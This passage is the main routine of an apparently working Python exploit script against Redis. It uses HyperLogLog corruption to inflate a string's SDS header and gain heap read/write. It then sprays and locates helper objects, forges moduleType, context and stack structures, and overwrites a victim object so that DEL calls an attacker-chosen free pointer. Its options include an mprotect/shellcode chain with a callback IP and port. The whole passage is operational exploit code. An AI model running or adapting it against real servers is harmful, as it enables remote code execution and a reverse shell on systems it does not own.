    ap.add_argument("--dispatch-followup-target", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--dispatch-followup-target-offset", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--module-type-free-offset", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--trigger", action="store_true")
    ap.add_argument("--keep", action="store_true")
    args = ap.parse_args()
    apply_fw_profile(args)

    if args.pivot_addr is None:
        if args.chain == "dispatch-crash" and args.eboot_base is not None:
            args.pivot_addr = args.eboot_base + args.dispatch_func_offset
        else:
            raise RuntimeError("--pivot-addr is required unless dispatch-crash derives it from --eboot-base")
    if args.chain == "dispatch-crash" and args.stack_arg_eboot_offset is not None:
        if args.eboot_base is None:
            raise RuntimeError("--stack-arg-eboot-offset needs --eboot-base")
        args.stack_arg = args.eboot_base + args.stack_arg_eboot_offset
    if args.chain == "dispatch-crash" and args.stack_ret_eboot_offset is not None:
        if args.eboot_base is None:
            raise RuntimeError("--stack-ret-eboot-offset needs --eboot-base")
        args.stack_ret = args.eboot_base + args.stack_ret_eboot_offset
    if args.chain == "dispatch-crash" and args.dispatch_arg_eboot_offset is not None:
        if args.eboot_base is None:
            raise RuntimeError("--dispatch-arg-eboot-offset needs --eboot-base")
        args.dispatch_arg = args.eboot_base + args.dispatch_arg_eboot_offset

    prefix = args.prefix or f"cx:hll:prepivot:{os.getpid()}:{int(time.time())}"
    sock = socket.socket()
    sock.settimeout(20)
    original_hll_max = None
    b_corrupted = False
    flags_reg = None

    print("=== Redis HLL Pre-spray Module Pivot ===")
    print(f"target={args.host}:{args.port} prefix={prefix} trigger={args.trigger}")

    try:
        sock.connect((args.host, args.port))
        print(f"PING: {hll.cmd(sock, 'PING')}")
        original_hll_max = hll.redis_config_get(sock, "hll-sparse-max-bytes")
        print(f"hll-sparse-max-bytes original={original_hll_max}")
        hll.redis_config_set(sock, "hll-sparse-max-bytes", hll.HIGH_HLL_MAX)

        print("[1] base HLL layout")
        hll.setup_layout(sock, prefix, fillers=args.layout_fillers)

        print("[2] calibrating B")
        _b_original, cal, flags_reg, changes = hll.find_calibration(sock, prefix)
        if cal < 0:
            raise RuntimeError("B calibration failed")
        print(f"cal_byte={cal} flags_reg={flags_reg} changes={len(changes)}")
        if args.preserve_cal_c_slot:
            hll.cmd(sock, "SET", k(prefix, "C"), b"\x00" * hll.SZ, timeout=30)
            print("[2b] re-primed C in the calibrated slot")

        print(f"[3] pre-spraying {args.eggs} address/raw helper objects")
        addr_marker = marker_for("addr")
        for i in range(args.eggs):
            hll.cmd(sock, "SET", k(prefix, f"pv_addr{i:04d}"), addr_marker + struct.pack("<I", i) + b"A" * 20)
        if args.lowrop_external_msg:
            msg_count = max(1, min(args.eggs, args.lowrop_external_msg_count))
            for i in range(msg_count):
                hll.cmd(
                    sock,
                    k(prefix, f"pv_msg{i:04d}"),
                    raw_marker_value("msg", i, args.lowrop_external_msg_size),
                    timeout=30,
                )
        raw_roles = ["mt", "stk", "ctx"]
        for role in raw_roles:
            raw_size = (
                args.stack_size if role == "stk"
                else args.ctx_size if role == "ctx"
                else DEFAULT_RAW_SIZE
            )
            for i in range(args.eggs):
                hll.cmd(sock, "SET", k(prefix, f"pv_{role}{i:04d}"), raw_marker_value(role, i, raw_size), timeout=30)

        print("[4] opening B inflated SDS window")
        flags_reg, opened_type, window = open_b_window(
            sock,
            prefix,
            flags_reg,
            args.flag_search_span,
            args.bruteforce_reg_values,
            prime_c=not args.preserve_cal_c_slot,
        )
        b_corrupted = True
        b_key = k(prefix, "B")
        print(f"selected_flags_reg={flags_reg} selected_type={opened_type} STRLEN(B)={window}")

        print("[5] resolving pre-sprayed object addresses through B")
        victim_key, victim_robj, b_sds = find_victim_and_b_sds(sock, b_key, window, args.scan_size, prefix)
        mt_key, mt_addr, mt_robj = find_presprayed_raw(sock, b_key, b_sds, window, args.scan_size, prefix, "mt")
        stack_key, stack_addr, stack_robj = find_presprayed_raw(sock, b_key, b_sds, window, args.scan_size, prefix, "stk")
        ctx_key, ctx_addr, ctx_robj = find_presprayed_raw(sock, b_key, b_sds, window, args.scan_size, prefix, "ctx")
        msg_key = None
        msg_addr = None
        msg_robj = None
        if args.lowrop_external_msg:
            msg_key, msg_addr, msg_robj = find_presprayed_raw(sock, b_key, b_sds, window, args.scan_size, prefix, "msg")
            msg_write_off = 0
            msg_align = max(1, args.lowrop_external_msg_align)
            if msg_align > 1:
                msg_aligned = (msg_addr + msg_align - 1) & ~(msg_align - 1)
                msg_write_off = msg_aligned - msg_addr
                msg_addr = msg_aligned
            args.lowrop_external_msg_write_offset = msg_write_off
            args.lowrop_external_msg_addr = msg_addr
        msg_part = "" if msg_robj is None else f" msg=0x{msg_robj:X}"
        print(f"[prespray] robjs mt=0x{mt_robj:X} stack=0x{stack_robj:X} ctx=0x{ctx_robj:X}{msg_part}")

        print("[6] writing fake moduleType/context/stack in pre-sprayed raw strings")
        if args.dispatch_arg_ctx:
            args.dispatch_arg = ctx_addr
        if args.dispatch_arg_stack_offset is not None:
            args.dispatch_arg = stack_addr + args.dispatch_arg_stack_offset
        if args.dispatch_arg_eboot_offset is not None:
            args.dispatch_arg = args.eboot_base + args.dispatch_arg_eboot_offset
        if args.stack_ret_eboot_offset is not None:
            args.stack_ret = args.eboot_base + args.stack_ret_eboot_offset
        stack_value, stack_info = build_stack_value(args, stack_addr)
        external_msg_value = None
        if stack_info and "lowrop_external_msg_value" in stack_info:
            external_msg_value = stack_info.pop("lowrop_external_msg_value")
        if stack_info:
            if "mprotect" in stack_info:
                print(
                    f"[chain] mprotect=0x{stack_info['mprotect']:X} "
                    f"page=0x{stack_info['stack_page']:X} len=0x{args.mprotect_len:X} prot=0x{args.mprotect_prot:X}"
                )
                print(
                    f"[chain] shellcode=0x{stack_info['shellcode_addr']:X} "
                    f"len=0x{stack_info['shellcode_len']:X} rop_qwords={stack_info['rop_qwords']} "
                    f"callback={args.callback_ip}:{args.callback_port}"
                )
            elif "patch_addr" in stack_info:
                print(
                    f"[chain] stack patch=0x{stack_info['patch_addr']:X} "
                    f"len=0x{stack_info['patch_len']:X} off=0x{stack_info['patch_offset']:X} "
                    f"bytes={stack_info['patch_hex']}"
                )
            elif "shellcode_addr" in stack_info:
                print(
                    f"[chain] stack shellcode=0x{stack_info['shellcode_addr']:X} "
                    f"len=0x{stack_info['shellcode_len']:X} off=0x{stack_info['shellcode_offset']:X} "
                    f"pair=(0x{stack_info['pair0']:X},0x{stack_info['pair1']:X})"
                )
            else:
                print(f"[chain] stack info={stack_info}")
        else:
            print(f"[chain] crash stack_arg=0x{args.stack_arg:X} stack_ret=0x{args.stack_ret:X}")
        ctx_value, dispatch_info = build_context_value(args, mt_addr, stack_addr, ctx_addr)
        if dispatch_info and args.chain == "direct-shellcode":
            print(
                f"[chain] direct-shellcode free=0x{args.pivot_addr:X} "
                f"shellcode=0x{dispatch_info['shellcode_addr']:X} "
                f"len=0x{dispatch_info['shellcode_len']:X} "
                f"callback={args.callback_ip}:{args.callback_port}"
            )
        elif dispatch_info:
            print(
                f"[chain] dispatch-crash func=0x{args.pivot_addr:X} "
                f"[ctx+0x{dispatch_info['field_func']:X}]=0x{dispatch_info['target']:X} "
                f"[ctx+0x{dispatch_info['field_arg']:X}]=0x{dispatch_info['arg']:X}"
            )
        write_fake_objects(
            sock, mt_key, stack_key, ctx_key, mt_addr, stack_addr, ctx_addr,
            args.pivot_addr, stack_value, ctx_value,
        )
        if external_msg_value is not None:
            if msg_key is None or msg_addr is None:
                raise RuntimeError("external lowrop message was built without a message helper key")
            msg_write_off = getattr(args, "lowrop_external_msg_write_offset", 0)
            if msg_write_off + len(external_msg_value) > args.lowrop_external_msg_size:
                raise RuntimeError(
                    f"external lowrop message len 0x{len(external_msg_value):X} "
                    f"at off 0x{msg_write_off:X} exceeds helper size 0x{args.lowrop_external_msg_size:X}"
                )
            hll.cmd(sock, "SETRANGE", msg_key, str(msg_write_off), external_msg_value, timeout=60)
            got_msg = hll.cmd(
                sock,
                "GETRANGE",
                msg_key,
                str(msg_write_off),
                str(msg_write_off + len(external_msg_value) - 1),
                timeout=60,
            )
            if got_msg != external_msg_value:
                raise RuntimeError("external lowrop message verification failed")
            print(
                f"[prespray] external msg=0x{msg_addr:X} off=0x{msg_write_off:X} "
                f"len=0x{len(external_msg_value):X} key={msg_key}"
            )

        victim_off = victim_robj - b_sds
        if not (0 <= victim_off < window):
            raise RuntimeError("victim robj outside B window")
        victim_orig = hll.cmd(sock, "GETRANGE", b_key, str(victim_off), str(victim_off + 15), timeout=60)
        if not isinstance(victim_orig, bytes) or len(victim_orig) != 16:
            raise RuntimeError(f"could not read victim robj: {victim_orig!r}")
        print(f"[prespray] victim before {hll.parse_robj(victim_orig)} B+0x{victim_off:X}")

        new_robj = struct.pack("<I", 5) + struct.pack("<I", 1) + struct.pack("<Q", ctx_addr)
        restored = False
        try:
            hll.cmd(sock, "SETRANGE", b_key, str(victim_off), new_robj, timeout=60)
            verify = hll.cmd(sock, "GETRANGE", b_key, str(victim_off), str(victim_off + 15), timeout=60)
            print(f"[prespray] victim after {hll.parse_robj(verify)}")
            if verify != new_robj:
                raise RuntimeError("victim overwrite did not verify")
            if args.trigger:
                print("[prespray] triggering DEL victim; disconnect/restart means pivot path reached")
                try:
                    res = hll.cmd(sock, "DEL", victim_key, timeout=5)
                    print(f"[prespray] DEL returned without disconnect: {res!r}")
                except Exception as exc:
                    print(f"[prespray] DEL disconnected/crashed client: {exc}")
                    return 0
        finally:
            if not args.trigger:
                try:
                    hll.cmd(sock, "SETRANGE", b_key, str(victim_off), victim_orig, timeout=60)
                    restored_bytes = hll.cmd(sock, "GETRANGE", b_key, str(victim_off), str(victim_off + 15), timeout=60)
                    restored = restored_bytes == victim_orig
                    print(f"[prespray] victim restored={restored}")
                except Exception as exc:
                    print(f"[prespray] victim restore failed: {exc}")
            else:
                restored = True

        if not restored:
            print("RESULT: dry-run wrote victim but restore did not verify")
            return 11
        if not args.trigger:
            try:
                print("[prespray] restoring B SDS_TYPE_16")
                hll.write_flags(sock, prefix, flags_reg, 2, "restore16")
                restored_len = hll.cmd(sock, "STRLEN", b_key, timeout=60)
                b_restored = restored_len == hll.SZ
                print(f"[prespray] B restore strlen={restored_len} restored={b_restored}")
                if b_restored:
                    hll.cmd(sock, "SET", b_key, b"\xbb" * hll.SZ, timeout=60)
                    b_corrupted = False
            except Exception as exc:
                print(f"[prespray] B restore failed: {exc}")
        if args.trigger:
            print("RESULT: DEL returned without crash; pivot was not reached")
            return 12
        print("RESULT: pre-spray dry-run succeeded; --trigger would call fake moduleType->free")
        return 0
    except Exception as exc:
        print(f"ERROR: {exc}")
        return 1
    finally:
        try:
            if original_hll_max is not None:
                hll.redis_config_set(sock, "hll-sparse-max-bytes", original_hll_max)
                print(f"hll-sparse-max-bytes restored={original_hll_max}")
        except Exception as exc:
            print(f"[!] config restore failed: {exc}")
        if (not args.keep) and (not b_corrupted):
            try:
                hll.cleanup(sock, prefix, include_b=True)
            except Exception as exc:
                print(f"[!] cleanup failed: {exc}")
        try:
            sock.close()
        except Exception:
            pass


if __name__ == "__main__":
    raise SystemExit(main())
